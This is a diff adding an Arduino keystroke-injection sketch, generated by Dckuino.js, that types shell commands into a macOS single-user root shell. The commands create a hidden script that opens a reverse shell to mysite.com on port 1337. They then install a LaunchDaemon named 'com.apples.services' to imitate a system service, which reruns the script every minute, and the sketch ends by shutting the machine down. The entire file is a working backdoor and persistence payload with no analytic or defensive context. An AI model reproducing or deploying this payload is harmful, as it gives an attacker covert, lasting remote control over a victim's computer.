@@ -1,0 +1,154 @@
+/*
+ * Generated with <3 by Dckuino.js, an open source project !
+ */
+
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(1000);
+
+  Keyboard.print("mount -uw /");
+
+  typeKey(KEY_RETURN);
+
+  delay(2000);
+
+  Keyboard.print("mkdir /Library/.hidden");
+
+  typeKey(KEY_RETURN);
+
+  delay(200);
+
+  Keyboard.print("echo '#!/bin/bash");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("bash -i >& /dev/tcp/mysite.com/1337 0>&1");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("wait' > /Library/.hidden/connect.sh");
+
+  typeKey(KEY_RETURN);
+
+  delay(500);
+
+  Keyboard.print("chmod +x /Library/.hidden/connect.sh");
+
+  typeKey(KEY_RETURN);
+
+  delay(200);
+
+  Keyboard.print("mkdir /Library/LaunchDaemons");
+
+  typeKey(KEY_RETURN);
+
+  delay(200);
+
+  Keyboard.print("echo '<plist version=\"1.0\">");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("<dict>");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("<key>Label</key>");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("<string>com.apples.services</string>");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("<key>ProgramArguments</key>");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("<array>");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("<string>/bin/sh</string>");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("<string>/Library/.hidden/connect.sh</string>");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("</array>");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("<key>RunAtLoad</key>");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("<true/>");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("<key>StartInterval</key>");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("<integer>60</integer>");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("<key>AbandonProcessGroup</key>");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("<true/>");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("</dict>");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("</plist>' > /Library/LaunchDaemons/com.apples.services.plist");
+
+  typeKey(KEY_RETURN);
+
+  delay(500);
+
+  Keyboard.print("chmod 600 /Library/LaunchDaemons/com.apples.services.plist");
+
+  typeKey(KEY_RETURN);
+
+  delay(200);
+
+  Keyboard.print("launchctl load /Library/LaunchDaemons/com.apples.services.plist");
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  Keyboard.print("shutdown -h now");
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
